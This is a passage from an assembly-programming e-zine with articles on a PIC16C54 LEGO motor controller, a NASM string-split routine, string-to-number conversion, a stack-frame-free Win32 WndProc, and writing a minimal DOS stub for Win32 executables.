+    ANDWF   F, d        d := W AND F
+    BCF     F, b        bit b in F is cleared   (i.e. made zero)
+    BSF     F, b        bit b in F is set       (i.e. made one)
+    BTFSC   F, b        if bit b in F is CLEAR, skip next instruction
+    BTFSS   F, b        if bit b in F is SET, skip next instruction
+    CALL    k           push PC, PC := k
+    CLRF    F           Clear file F
+    CLRW                Clear file W
+    CLRWDT              Clear Watchdogtimer
+    COMF    F           F := NOT F              (1's complement)
+    DECF    F, d        d := F - 1
+    DECFSZ  F, d        d := F - 1; If 0 => skip next instruction
+    GOTO    k           PC = k
+    INCF    F, d        d := F + 1
+    INCFSZ  F, d        d := F + 1; If 0 => skip next instruction
+    IORLW   k           W := W OR k
+    IORWF   F, d        d := W OR F
+    MOVF    F, d        d := F          (zero flag affected)
+    MOVLW   k           W := k
+    MOVWF   F           F := W
+    NOP                 No operation
+    OPTION              OPTION := W
+    RETLW   k           W := k, pop PC
+    RLF     F, d        d := rotate left through carry (F)
+    RRF     F, d        d := rotate right through carry (F)
+    SLEEP               enter powerdown mode
+    SUBWF   F, d        d := F - W              (2's complement)
+    SWAPF   F, d        d := swap-nibbles (F)
+    TRIS    F           TRIState information for I/O pins
+    XORLW   k           W := W XOR k
+    XORWF   F, d        d := W XOR F
+
+Especially the "F, d" construct takes some getting used to.
+
+Below is the source for the "LEGO controller":
+
+--------------------------------------------------------------------------
+title   "LEGO 003"
+subtitl "control LEGO technic devices"
+
+LIST    P=16C54, R=HEX, F=INHX8M, C=120, E=0, N=80
+PIC54   equ     1FFH            ; Define Reset Vectors
+
+RTCC    equ     1h              ; define register designators
+PC      equ     2h              ; the program counter is a register as well
+STATUS  equ     3h              ; F3 Reg is STATUS Reg.
+PORT_A  equ     5h
+PORT_B  equ     6h              ; I/O Port Assignments
+
+RTCC_tc equ     0Dh             ; time constant for RTCC
+count_1 equ     0Eh             ; delay counters and GP registers
+count_2 equ     0Fh
+
+file    equ     1
+w       equ     0
+
+flag_0  equ     0               ; input bits in RA port
+flag_1  equ     1
+flag_2  equ     2
+flag_3  equ     3
+
+LED_0   equ     0               ; status led 1, in RB Port
+LED_1   equ     1               ; status led 2
+RL_1    equ     2               ; relays 1 - 3
+RL_2    equ     3
+RL_3    equ     4
+s_clk   equ     5               ; s_clk input
+s_data  equ     6               ; s_data input
+go      equ     7
+
+delay   movlw   .100            ; mov W with 100 decimal
+        movwf   count_1         ; xfer W to register
+dela_1  clrf    count_2         ; count_2 = 0
+dela_2  decfsz  count_2, file   ; count_2 = count_2 - 1
+        goto    dela_2          ; skip this instruction if count_2 = 0, ...
+        decfsz  count_1, file   ; ... ending here: count_1 = count_1 - 1
+        goto    dela_1          ; skip this instruction when count_1 = 0
+        retlw   0               ; ending here, if so.
+
+flash   bcf     PORT_B, LED_1   ; flash LED's 0 and 1 as an acknowledgement
+        bsf     PORT_B, LED_0   ; activate the LED's.
+        call    delay           ; wait a while
+        bcf     PORT_B, LED_0   ; toggle the LED's
+        bsf     PORT_B, LED_1
+        call    delay           ; wait a second!
+        bcf     PORT_B, LED_1   ; turn LED_1 off as well.
+        retlw   0               ; return to caller with W = 0
+
+RT_chk  clrwdt                  ; clear the watchdog timer
+        btfsc   RTCC, 7         ; RELAY_3 follows bit7 of RTCC
+        bcf     PORT_B, RL_3
+        btfss   RTCC, 7
+        bsf     PORT_B, RL_3
+        movf    RTCC, w
+        skpz                    ; internal macro for BTFSS  STATUS, 2
+        retlw   0
+        movf    RTCC_tc, w      ; if
+        movwf   RTCC
+        retlw   0
+
+start   clrf    RTCC
+        clrf    RTCC_tc         ; clear RTCC and RTCC time constant
+        movlw   B'00001111'
+        tris    PORT_A          ; define port A as inputs
+        movlw   B'11100000'
+        tris    PORT_B          ; define port B as I/O
+        movlw   B'00110111'
+        option                  ; define state of WDT, RTCC and prescaler
+        movlw   B'00011100'
+        movwf   PORT_B          ; initialize port B
+        call    flash           ; signal READY
+        call    flash
+        btfss   PORT_B, s_clk   ; if s_clkline low, check for mode 2 request
+        goto    m_chk
+repeat  clrwdt                  ; clear watchdog timer
+        call    flash
+        movf    PORT_A, w       ; read port A into W
+        andlw   3               ; mask off sensor inputs
+        skpnz                   ; skip next instruction if NonZero
+        goto    set_tc          ; flag_0 and _1 zero => define RTCC time constant
+        btfsc   PORT_A, flag_0
+        goto    t_left
+        btfsc   PORT_A, flag_1
+        goto    t_right
+        movf    PORT_B, w
+        andlw   s_clk + s_data + go
+        skpnz                   ; if no RESET condition, skip
+        goto    start
+        call    RT_chk
+        goto    repeat
+
+t_left  btfsc   PORT_A, flag_2  ; if in end position, do not turn at all
+        goto    l_exit
+        bcf     PORT_B, RL_1    ; else set direction for Turn Left
+        bsf     PORT_B, RL_2
+        bsf     PORT_B, LED_0   ; show direction with LED's
+        bcf     PORT_B, LED_1
+chk_fl2 btfsc   PORT_A, flag_2  ; wait until home-position is reached
+        goto    l_exit          ; if so, get out
+        call    RT_chk          ; if not, check again
+        goto    chk_fl2         ; until done
+l_exit  bsf     PORT_B, RL_1    ; release relay 1
+        bcf     PORT_B, LED_0   ; extinguish light 0
+        goto    repeat          ; jump back
+
+t_right btfsc   PORT_A, flag_3  ; if in end position, do not turn at all
+        goto    r_exit
+        bcf     PORT_B, RL_2    ; else set direction for Turn Right
+        bsf     PORT_B, RL_1
+        bsf     PORT_B, LED_1   ; show direction with LED's
+        bcf     PORT_B, LED_0
+chk_fl3 btfsc   PORT_A, flag_3  ; wait until home position reached
+        goto    r_exit
+        call    RT_chk
+        goto    chk_fl3
+r_exit  bsf     PORT_B, RL_2    ; deactivate lights and relays
+        bcf     PORT_B, LED_1
+        goto    repeat
+
+m_chk   clrf    count_1         ; check inputs and make sure there's no glitch
+        clrf    count_2
+m_chk_1 btfss   PORT_B, s_clk
+        decf    count_1, file   ; count pulses s_clkline = low
+        decfsz  count_2, file
+        goto    m_chk_1
+        movf    count_1, w      ; w = low-pulses
+        subwf   count_2, w      ; if count_1 <> count_2, glitch occurred
+        skpz
+        goto    start
+
+set_tc  movf    RTCC, w         ; move current value of RTCC
+        movwf   RTCC_tc         ; to time constant register
+        goto    repeat
+
+        org     PIC54           ; goto highest word in code space
+        goto    start           ; and place the reset vector.
+
+        end
+
+--------------------------------------------------------------------------
+
+If you ever programmed an HP 11 (or 12, 15 or 16) calculator, the conditional
+jumps may ring a bell. I don't know how the HP machines handle these jumps,
+but the PIC line does the following:
+
+      condition         action by PIC
+      ---------         -----------------------------------
+        FALSE           execute next instruction
+        TRUE            replace next instruction with a NOP
+
+This enables the programmer to make 100% accurate timingloops since there is
+no difference between a FALSE and a TRUE condition.
+
+The size of this piece of code is easy to calculate: each line with an
+mnemonic is one instructionword. This makes 115 words from the 512 word
+program memoryspace, so we have nearly 400 instructionwords wasted.
+
+The PIC's are marvelous chips to bridge the gap between lots and lots of TTL
+chips and the overkill of a microcontroller unit with separate RAM, ROM and
+I/O. If you want to find out more of this kind of CPU's, visit the website at
+
+        http://www.microchip.com
+
+for PDF datasheets and more. Scenix also has a range of clones out, right now.
+They are software compatible but offer more hardware features. Which is not
+difficult since the codeword in the design of the PIC's seemed to have been
+KISS.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+																				  Splitting Strings
+																				  by mammon_
+
+Those familiar with Perl will undoubtedly have used its split() function, which
+takes a single string and splits it into multiple strings or into an array, 
+based on a delimiter character specified in the call. Typical invocations of 
+split() would be:
+
+     ($field1, $field2, $junk) = split(':', $line);
+     @array = split(' ', $line);
+	  
+In the first line, the source string is split into a maximum of 3 substrings, 
+creating a new string each time it encounters a colon character; note that the 
+third string, $junk, contains the entire rest of the string -- only the first 2 
+colons will be parsed. In the second line, an array of strings is created by 
+splitting the source string at the space character; since the number of destin-
+ation strings is not specified, the array will contain one element for each 
+substring [read: each string created by splitting the original at a whitespace
+character].
+
+Strings and string parsing are notably tedious in assembly. Once learning Perl,
+I found that the pseudocode for many of my asm programs started to include a 
+few calls to 'split', since it is a handy one-line method of string parsing,
+applicable to processing command lines, user input, and data files. As a result,
+it quickly became necessary to write such a routine.
+
+Being that asm has no inherent array or string tokenizing support, there are 
+many possible approaches to string splitting. Since the most immediate problem 
+is that the split() routine does not know in advance how many substrings it 
+will be creating, there is a temptation to code a strtok() replacement, such
+that the first call returns the first substring, and subsequent calls each 
+return the next substring until the end of the string has been reached:
+
+		  mov ecx, ptrArray
+		  push dword ptrString
+		  push dword [delimiter]
+		  call split
+		  mov [ecx], eax
+.loop:
+		  call split
+		  cmp eax, 0
+		  je .end
+		  mov [ecx], eax
+		  add ecx, 4
+		  jmp .loop
+.end:
+
+This allows for control over the number of substrings created by only calling 
+split() the desired number of times; however this method also requires a lot 
+of caller-side work --setting up an array, moving the string pointer returned 
+in eax to an appropriate array position, and keeping track of the number of 
+array elements. It is also noticeably more clumsy than the Perl version.
+
+Another method would be to mimic the Perl function entirely, and have split()
+return an array of substrings:
+
+		  push dword ptrString
+		  push dword [delimiter]
+		  call split
+		  mov [ptrStringArray], eax
+		  
+This is obviously more elegant on the caller side, but it has a few subtle 
+problems: first, the control over how many elements is split is lost;  
+secondly, the array is of indefinite element size [i.e., one would have to 
+scan each string again in order to find the end and thus the next string];
+and lastly, the duplication of the string in memory is somewhat of a waste.
+
+The C language has more or less created a string standard in which strings are
+terminated with a null ['\0' or 0x0] character. Most library or OS functions 
+to which the split strings will be passed tend to expect this termination; thus
+each substring is going to have a termination byte added. However, this termin-
+ation byte can replace the delimiter for each substring, thus allowing the 
+original string itself to serve as the array of substrings after the split 
+function. Thus, all that is required from the split function is to return an 
+array of dword pointers into the original string, and a count of the array 
+elements [substrings]:
+
+		  push dword ptrString
+		  push dword [delimiter]
+		  call split
+		  mov [ptrStringArray], eax
+		  mov [StringArrayNum], ebx
+		  
+The split function will have to create a DWORD element for each substring 
+it splits; while this is somewhat wasteful, it is still less expensive than 
+copying the entire string a second time, unless the string is composed of 
+1-3 byte substrings. In order to control the number of splits, a 'max_split'
+parameter will have to be added to the split() routine, such that if max_split
+is NULL, the split() routine will return the maximum possible number of
+substrings; if max_split is non-NULL, split() will return max_split or fewer 
+substrings.
+
+The complete split routine is as follows:
+
+#--------------------------------------------------------------------split.asm
+;    split( char, string, max_split)
+;     Returns address of array of pointers into original string in eax
+;     Returns number of array elements in ebx
+;     Behavior:
+;           split( ":", "this:that:theother:null\0", NULL)
+;           "this\0that\0theother\0null\0"
+;           ptrArray[0] = [ptrArray+0] = "this\0"
+;           ptrArray[1] = [ptrArray+4] = "that\0"
+;           ptrArray[2] = [ptrArray+8] = "theother\0"
+;           ptrArray[3] = [ptrArray+C] = "null\0"
+EXTERN malloc
+EXTERN free
+
+split:
+	push ebp
+	mov ebp, esp            ;save stack pointer
+ 	mov ecx, [ebp + 8] 		;max# of splits
+ 	mov edi,	[ebp + 12] 		;pointer to target string
+ 	mov ebx, [ebp + 16]		;splitchar
+	
+	xor eax, eax				;zero out eax for later
+	mov edx, esp				;save current stack pos.
+	push dword edi				;save ptr to first substring
+ 	cmp ecx, 0					;is #splits NULL?
+	jnz do_split            ;--no, start splitting
+	mov ecx, 0xFFFF			;--yes, set to MAX
+	
+do_split:						
+	mov bh, byte [edi]      ;get byte from target string
+	cmp bl, bh					;equal to delimiter?
+	je .splitstr            ;--yes, then split it
+	cmp al, bh					;end of string? [al == 0x0]
+	je EOS                  ;--yes, then leave split()
+	inc edi						;next char
+	loop do_split 
+.splitstr:
+	mov [edi], byte al	   ;replace split delimiter with "\0"
+	inc edi						;move to first char after delimiter
+	push edi						;save ptr to next substring
+	loop do_split				;loop #splits or till EOS
+	
+EOS:
+	mov ecx, edx				;edx, ecx == original stack position
+	sub ecx, esp				;get total size of pushed pointers
+	push ecx						;save size 
+	call malloc					;allocate that much space for array
+	test eax, eax
+	jz .error
+	pop ecx						;restore size
+	mov edi, eax				;set destination to beginning of array
+	add edi, ecx				;move to end of array
+	shr ecx, 2					;divide total size/4 [= # of dwords to move]
+	mov ebx, ecx				;save count
+	
+.store:
+	sub edi, 4					;move to beginning of dword
+	pop dword [edi] 			;pop from stack to array
+	loop .store
+
+.error:
+	mov esp, ebp
+	pop ebp
+	ret							;eax = array[0], ebx = array count
+#------------------------------------------------------------------------EOF
+
+The use of the stack in this routine may be a little unclear. Each time a 
+delimiter is encountered, the a pointer to the character after the delimiter
+is pushed onto the stack:
+		  this:that:theother\0
+		  ^----------------------This is pushed at the very beginning.
+		                         Element#: array[0]
+		  this:that:theother\0
+		       ^-----------------This is pushed when the first ':' is found.
+								       Element#: array[1]
+		  this\0that:theother\0
+		             ^-----------This is pushed when the second ':' is found
+						             Element#: array[2]
+        this\0that\0theother\0
+		                         The stack now looks like this:
+										 --------------[ebp]
+										 ptr->string1
+										 ptr->string2
+										 ptr->string3
+										 --------------[esp]
+										 The string pointers are then POPed into the 
+										 array, starting with array[2] and ending with
+										 array[0].
+										 
+Once the string is parsed and the pointers are PUSHed to the stack, edi is set
+to the address of the array [mov edi, eax] and advanced to the end of the 
+allocated array [add edi, ecx]. The counter is then set to the number of DWORD
+pointers that have been pushed onto the stack [shr ecx, 2]; for each DWORD 
+pointer, edi is withdrawn 4 bytes more from the end of the array [sub edi, 4] 
+and the pointer is POPed into that 4 byte space. In the last iteration of the 
+loop, edi is set to the beginning of the allocated array, and the first DWORD 
+pointer [ array[0] ] is POPed into the first array element.
+										 
+To test this, of course, one needs a program to drive it. The following code
+simulates an /etc/passwd read, splitting a hard-coded line into its component,
+colon-delimited fields:
+
+#----------------------------------------------------------------splittest.asm
+BITS 32
+GLOBAL main
+EXTERN printf
+EXTERN free
+EXTERN exit
+%include 'split.asm'
+
+SECTION .text
+main:
+	push dword szString		;print the original string
+	push dword szOutput
+	call printf
+	add esp, 8
+	
+	push dword ":"				;split the original string
+	push dword szString
+	push dword 0
+	call split
+	add esp, 12
+	
+	mov ecx, ebx
+	mov ebx, eax
+printarray:						;print the substrings
+	push ecx						;printf hoses ecx!!!!!
+	push dword [ds:ebx]
+	push dword szOutput
+	call printf
+	add esp, 8
+	add ebx, 4					;skip to next array element
+	pop ecx
+	loop printarray
+	
+	push dword [ptrarray]	;free the array created by split
+	call free
+	add esp, 4
+
+	push dword 0				;program is done
+	call exit
+
+SECTION .data 
+szOutput	db '%s',0Ah,0Dh,0									;printf format string
+szString	db	'name:password:UID:GID:group:home',0	;string to print
+#------------------------------------------------------------------------EOF
+
+This program was written using nasm on a glibc Linux platform; however the 
+split routine itself is fairly portable --the only assumed external routine 
+is malloc() and -- and can easily be rewritten for the DOS or win32  platforms.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+																   String to Numeric Conversion
+                                                   by Laura Fairhead
+
+
+    Here I present you with a library routine that scans a value from
+a string and converts it to an integer. It is very useful, not only
+when you have to convert string->value but also if you are parsing and
+want to recognise a numeric token.
+
+    The routine will scan values in any radix from 0 to 36. Characters
+for the digit values from 10-35 are naturally "A"-"Z"/"a"-"z". 
+
+    With this routine there are 2 API's 'scanur' and 'scanu'. 'scanur'
+is used to set the radix of the scan conversion. Once this value is
+set the main routine 'scanu' can be called freely to scan values from
+the string.
+
+    The scan routine is called with a string pointer which is updated
+on exit to the first invalid character. It will return with the carry
+flag set if the value was too big to fit into the return register EAX.
+If the carry flag is clear, there is no error, however now the zero flag
+indicates if a valid value was actually scanned. This return status
+convention gives the most flexibility to the application programmer,
+also if a valid value MUST be scanned they can detect the condition
+via:-
+
+    CALL NEAR PTR scanu
+    JNA error               ;get out if overflow/no value
+
+    The branch will be taken if CF=1 or ZF=1. Hence, if a value has to be
+scanned errors may be picked up with only one test.
+
+
+=========START OF CODE=====================================================
+;
+;(current scan radix)
+;
+scanuradi:
+        DB ?
+
+;
+;scanur-    set up for scanu routine
+;
+;entry:     AL=radix
+;
+;        !! radix must be in range 0<=radix<=36
+;
+;        !! radix must be set by calling this routine prior to
+;        !! using scanu
+;
+;exit:      (all registers preserved)
+;
+
+scanur  PROC NEAR
+
+        MOV BYTE PTR CS:[scanuradi],AL
+        RET
+
+scanur  ENDP
+
+;
+;scanu-     scan string value returning result
+;
+;entry:     DS:SI=address of string
+;           DF=0
+;
+;        !! radix must be set previously by calling 'scanur'
+;
+;exit:      SI=updated to offset of first invalid character
+;
+;           CF=1
+;            a numeric overflow has occurred, ie: the number being scanned
+;           has become too big to fit into EAX
+;
+;           CF=0
+;            if ZF=0 then a valid value was scanned, if ZF=1 then no
+;           valid digits were scanned
+;
+;           EAX=converted value
+;
+
+scanu   PROC NEAR
+;
+;preserve registers
+;
+        PUSH EDX
+        PUSH EBX
+        PUSH ECX
+        PUSH DI
+;
+;initialise
+;  EBX=radix constant
+;  EAX=total
+;  ECX=0, bits8-24 of ECX always=0 to pad byte digit to dword
+;   DI=holds original offset
+;
+        XOR EAX,EAX
+        XOR EBX,EBX
+        XOR ECX,ECX
+        MOV DI,SI
+        MOV BL,BYTE PTR CS:[scanuradi]
+;
+;main loop start
+; EAX,ECX change roles so that we can use AL for the digit calculation
+; saving code length
+;  
+lop:    XCHG EAX,ECX
+        LODSB
+;
+;if "0"-"9" map to 0-9 and skip to radix check
+;
+        SUB AL,030h
+        CMP AL,0Ah
+        JC SHORT ko
+        ADD AL,030h
+;
+;map "A"-"Z"-/"a"-"z"- to 10-35- aborting on the one invalid value (040h)
+;that won't get trapped in the next stage
+;
+        AND AL,0DFh
+        SUB AL,037h
+        CMP AL,0Ah
+        JC SHORT ko2
+;
+;digit value checked that it is valid for the current radix
+;this also weeds out previous invalid values (since they would be >35)
+;jump out of loop is delayed so that EAX can be restored for exit
+;
+ko:     CMP AL,BL
+        CMC
+ko2:    XCHG EAX,ECX
+        JC SHORT erriv
+;
+;accumalate the digit to the total. the total must be pre-multiplied.
+;checks for overflow are done at both points so the routine can never
+;generate false results
+;
+        MUL EBX
+        JC errovr
+        ADD EAX,ECX
+        JNC lop
+;
+;overflow error
+;   adjust SI index to current char and exit, note
+;   that CF =1 already
+;
+errovr: DEC SI
+        JMP SHORT don
+;
+;invalid character
+;   main exit point, SI is adjusted to the current char
+;   the CMP ensures that CF =0, and also that ZF =1 iff
+;   no chars have been read
+;
+erriv:  DEC SI
+        CMP SI,DI
+;
+;(restore registers and exit)
+;
+don:    POP DI
+        POP ECX
+        POP EBX
+        POP EDX
+        RET
+
+scanu   ENDP
+
+=========END OF CODE=======================================================
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::................................WIN32.ASSEMBLY.PROGRAMMING
+                                                        WndProc, The Dirty Way
+																		  by X-Calibre of Diamond
+
+
+I assume you all know what a WndProc is, and what you need it for. Let me
+give you a quick example of a WndProc:
+
+    WndProc   PROC hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
+        .IF uMsg == WM_DESTROY
+            INVOKE PostQuitMessage, NULL
+        .ELSE
+            INVOKE DefWindowProc, hWnd, uMsg, wParam, lParam
+            ret
+        .ENDIF
+            xor   eax, eax
+            ret
+    WndProc   ENDP
+
+This generates the following code:
+
+    push  ebp                                   ; Create stack frame
+    mov   ebp, esp                              ; Why does MASM use 'leave',
+                                                ; but not 'enter'?
+
+    cmp   dword ptr [ebp+0C], WM_DESTROY        ; ebp+0C is uMsg
+    jne   @@notDestroy
+
+    push  NULL
+    Call  PostQuitMessage
+    jmp   @@exitFromDestroy
+
+    @@notDestroy:
+    push  [ebp+14]                              ; ebp+14 is lParam
+    push  [ebp+10]                              ; epb+10 is wParam
+    push  [ebp+0C]                              ; ebp+0C is uMsg
+    push  [ebp+08]                              ; ebp+08 is hWnd
+    Call  DefWindowProcA                        ; Let Windows handle the other
+                                                ; messages
+
+    leave                                       ; Remove stack frame
+    ret   0010                                  ; Remove function arguments
+                                                ; from stack and return
+
+    @@exitFromDestroy:
+    xor   eax, eax                              ; Return 'FALSE'
+    leave                                       ; Remove stack frame
+    ret   0010                                  ; Remove function arguments
+                                                ; from stack and return
+
+Looks nice, and works fine... But, it builds a stack frame, even though we are
+not using local variables. And if you code in a good fashion, there almost
+never will be ...after all, this procedure is just a messagehandler, and to keep 
+your code tidy, you will not put all the code in here, but in separate procedures,
+which you will call from here.
+
+There's only one reason why MASM builds a stack frame for a function: The
+function has a prototype for a hll call. A hll call uses the stack to transfer
+its arguments.
+
+So, all we have to do, is remove the prototype. That's easy: Just don't tell
+MASM that this function uses any arguments.
+This simple tweak will do the trick:
+
+    WndProc   PROC
+        ...
+    WndProc   ENDP
+
+The arguments will still be passed to the function, since that part of the
+code is in the Windows kernel, and has not changed. Be careful though: Since
+MASM does not know that there are arguments on the stack, it no longer cleans
+up the stack. You have to specify that yourself.
+
+Now we have a slight problem: How can we access the arguments now?
+The answer is surprisingly easy: We create aliases for the addresses relative
+to the stack pointer (esp). MASM does the same, except that it uses the base
+pointer since it created a stack frame, and saved the original stack pointer
+in ebp.
+Knowing that Windows hll calls always push the arguments in reverse order, and
+that the return address is stored on the stack aswell, we can devise these
+indices for our parameters:
+
+    hWnd    EQU    dword ptr [esp][4]
+    uMsg    EQU    dword ptr [esp][8]
+    wParam  EQU    dword ptr [esp][12]
+    lParam  EQU    dword ptr [esp][16]
+
+There, now we can refer to the arguments as usual.
+There's 1 drawback however: Since the indices are relative to esp, they are
+only valid when esp is not touched. In other words: Don't try to push or pop
+anything and then use these arguments again. They can be used if you push some
+variables, then pop them again before you access any of these arguments again,
+because the stack pointer will be at the correct position again.
+
+Let's say you need to use the stack again (eg. for an INVOKE), so the indices
+will be invalidated. You might think that the only option then is to save the
+stack pointer again, so we're back to the stack frame...
+It's an option, but not the best one. Namely, ebp is a non-volatile register,
+and needs to be saved and restored after use.
+But, there are more registers in the CPU, and most of them are volatile. How
+about using esi for example?
+
+    WndProc   PROC
+        mov   esi, esp
+        hWnd    EQU    dword ptr [esi][4]
+        uMsg    EQU    dword ptr [esi][8]
+        wParam  EQU    dword ptr [esi][12]
+        lParam  EQU    dword ptr [esi][16]
+
+        ...
+    WndProc   ENDP
+
+And if you leave the stack as you found it (which should always be the case
+with decent code), you don't even need to restore esp again.
+If you got dirty and the stack still contains variables you don't want
+anymore, then this is enough for a clean exit:
+
+    WndProc   PROC
+        ...
+        mov   esp, esi
+        ret   4 * sizeof dword      ; As I mentioned earlier, we have to clean
+                                    ; the stack ourselves.
+                                    ; We had 4 dword arguments, so this does
+                                    ; the trick
+    WndProc   ENDP
+
+Still less code, and thus faster than the original. And just as rigid. You
+have one register less to use during the WndProc, but as I said earlier, there
+shouldn't be too much code here, so should be able to spare the register.
+
+Well, there's just 1 more thing that can be done with this tweaked WndProc.
+Namely, if you leave the stack as you found it, the arguments for the
+DefWindowProc are already in place, and the return address of our caller is
+there too.
+So basically we can just jump to it without any further ado. The resulting
+WndProc that is equivalent to the original one will look like this then:
+
+    WndProc   PROC
+        hWnd    EQU    dword ptr [esp][4]
+        uMsg    EQU    dword ptr [esp][8]
+        wParam  EQU    dword ptr [esp][12]
+        lParam  EQU    dword ptr [esp][16]
+
+        .IF uMsg == WM_DESTROY
+            INVOKE PostQuitMessage, NULL
+        .ELSE
+            jmp  DefWindowProc
+        .ENDIF
+
+        xor   eax, eax
+        ret   4 * sizeof dword      ; Be sure to clean that stack!
+    WndProc   ENDP
+
+Yes, much shorter, and faster. Let's take a look at the generated code to get
+a better understanding of how much shorter it actually is:
+
+    cmp   dword ptr [esp+08], WM_DESTROY
+    jne   @@noDestroy
+
+    push  NULL
+    Call  PostQuitMessage
+    jmp   @@exitFromDestroy
+
+    @@noDestroy:
+    Jmp   DefWindowProcA
+
+    @@exitFromDestroy
+    xor   eax, eax
+    ret   0010
+
+If you code it 'by hand' instead of with the .IF statement, there's another
+tweak we can pull, but the rest looks great, doesn't it?
+
+Of course these stunts can be applied to other procedures as well. Be careful,
+and use them in good health.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::................................WIN32.ASSEMBLY.PROGRAMMING
+                                                       Programming the DOS Stub
+																		  by X-Calibre of Diamond
+
+
+As you may (or may not) know, there is a piece of DOS code still in every
+Win32 executable file. This piece of code is referred to as the 'stub' and
+ensures that the Win32 program won't cause a crash when run on a DOS system.
+It just prints the familiar 'This program can not be run in DOS' message and
+exits.
+
+'So what do we care?' you might ask... Well, Microsoft's linker provides the
+option to link your own stub instead of the standard one. And, you must have
+guessed it already by now: We can do it better than Microsoft!
+
+So, how do we do this then?
+
+Well, actually it's very simple: The first part of the Win32 executable is
+literally a DOS file. There's just one small requirement: at offset 3Ch (60)
+there is a DWORD specifying the start of the PE block relative to the start of
+the file (the offset).
+
+So basically you can just put any DOS EXE program in there, as long as you
+make sure that there is room for the DWORD at offset 3Ch in the file. Usually
+this is no problem, since the EXE header itself is usually quite big, and a
+lot of the space is not being used. Microsoft's own stub has an empty header
+mostly, and the code starts right after the DWORD, at offset 40h.
+
+That's all fine and nice and whatever, but what can we do with this info?
+Well, you could link in an entire DOS program for people not using Windows
+(Look at REGEDIT.EXE in Windows 9x for an example). You could include a Fire
+or Plasma effect when your program is run in DOS. You could create your own 
+'This program can not be run in DOS mode' message. But, most importantly: 
+you can create smaller EXE files! One of the nicer applications of this stub, 
+which I'm going to explain a bit here.
+
+What is the smallest size for the stub, theoretically speaking?
+
+Well, considering the fact that at offset 60 there MUST be an offset pointing
+to the PE header, the minimum size will be 60 bytes.
+The actual stub file has to be 64 bytes, because of restrictions of Microsoft's
+linker. But be sure not to use the last 4 bytes, since the linker will put in
+the offset there.
+
+Well, so in 60 bytes, you can't really do much. But just printing a small
+warning for DOS users and then exiting is just about possible. Microsoft made
+their version a little large: 120 bytes. So we can try to do just about the
+same in 60 bytes.
+
+We're going to use a little trick here, to get the program as small as 60
+bytes. At offset 20h, there is room for a relocation table for the code. But
+since we won't be needing them, we're going to put our code in there. This
+is perfectly possible, because you can specify how many relocation table items
+your program will be using. We just put in a 0 word at offset 6 in the header,
+and the table is ours. Technically speaking, the code is still after the table.
+The table just has a length of 0 bytes.
+
+For all you non-DOS coders out there, this is what the program looks like:
+
+;====================================================================stub.asm
+.Model Tiny
+
+.code
+start:
+    push cs      ; Point the data segment to the code segment, since
+    pop  ds      ; we're putting the data after the code to save space.
+
+    mov  dx, offset message ; Load pointer to the string for the call.
+    mov  ah, 9              ; 9 is the print argument for int 21h.
+    int  21h                ; The DOS interrupt.
+
+    mov  ah, 4Ch            ; 4C is the exit argument for int 21h
+    int  21h
+
+; Put our string here
+message db      "Windows prg!",0Dh,0Ah,'$'
+
+; A little explanation may be required:
+;
+; 0Dh is the 'Carriage return' ASCII code.
+; 0Ah is the 'Line feed' ASCII code.
+; '$' is the string-terminator in DOS (like 0 is in Windows and other C based
+; OSes)
+end start
+;=========================================================================EOF
+
+The message can be 15 bytes at most, including the string terminator, since
+the program itself starts at offset 32 in the file, and is 12 bytes long.
+(32+12+15 = offset 59 bytes, so the next byte will be used for the PE offset
+DWORD).
+
+This version yields an undefined error code on exit. The error code is
+specified in al when you call the exit DOS function. The errorcode actually
+depends on the output in al of the int 21h call that prints the string. This
+is ofcourse undefined (actually it is 24h in Windows 98).
+
+Microsoft's stub has a defined errorcode of 1. If you want to make your stub
+100% the same, then you must replace the 'mov ah, 4Ch' with 'mov ax, 4C01h'.
+Mind you, that this code is 1 byte longer, so your message can then be only 14
+bytes long in total.
+
+Since I'm never going to use the errorcode, I decided to save the byte and use
+a larger string.
+
+And that's that. Now you may run into trouble with the linker. I couldn't find
+a linker that kept the EXE header to its minimum (which is 32 bytes). I used
+TLINK, which made a 512 byte header. So I just edited the file manually, and
+got it to its minimum size. A document explaining the EXE header format is
+enclosed, and so is the STUB.EXE I made, and a small Win32 application using
+it (with relocated PE header at 40h).
+I will just briefly describe how the filesize is stored in the header, since
+the document is not particularly clear there.
+
+offset  length  description                             comments
+----------------------------------------------------------------------
+2       word    length of last used sector in file      modulo 512
+4       word    size of file, incl. header              in 512-pages
+
+The '512-pages' at offset 4 are (floppy) disk sectors. They are 512 bytes
+each. So to calculate how many sectors your file will occupy, this formula
+will suffice:
+
+    sectors = CEILING(filesize/512)
+
+CEILING means to round off to nearest natural number above the fraction.
+
+The length of the last used sector at offset 2 stores how many bytes are
+occupied in the last sector of the file. Like the comment says, it's filesize
+modulo 512.
+In other words:
+
+    lastusedsector = filesize - FLOOR(filesize/512)
+
+The other way around is ofcourse like this:
+
+    filesize = (sectors - 1)*512 + lastusedsector
+
+A little note here: Look at these 2 values in a program with the standard
+Microsoft stub (eg. NOTEPAD.EXE).
+We find these 2 values:
+
+offset 2: 0090h
+offset 4: 0003h
+
+So the filesize is: (3 - 1)*512 + 144 = 1168
+
+Now wait just a second! At offset 3Ch we find 00000080h...
+So at offset 128 we find the PE header and the Windows program. Then how can
+the DOS stub be 1168 bytes?
+
+It can't!! Microsoft goofed up here... They have probably hand-edited the
+EXE file they used for the stub like I did, and forgot to edit these values.
+Luckily for them, this bug does no harm. But still...
+
+Well, after we have created our DOS stub, all we have to do is link it in.
+With Microsoft's linker it goes like this:
+
+LINK code.obj /SUBSYSTEM:WINDOWS /STUB:STUB.EXE
+
+And that's all you need!
+You can ignore the warning the linker gives about the incomplete header. We
+know that the program runs. The linker just doesn't consider EXE headers with
+no relocation table (which could actually be considered a bug, since our EXE
+header specifies that the table has length 0, and therefore the code can start
+at offset 20h. The DOS EXE loader does interpret it correctly, so in fact, the
+linker could be considered incompatible).
+
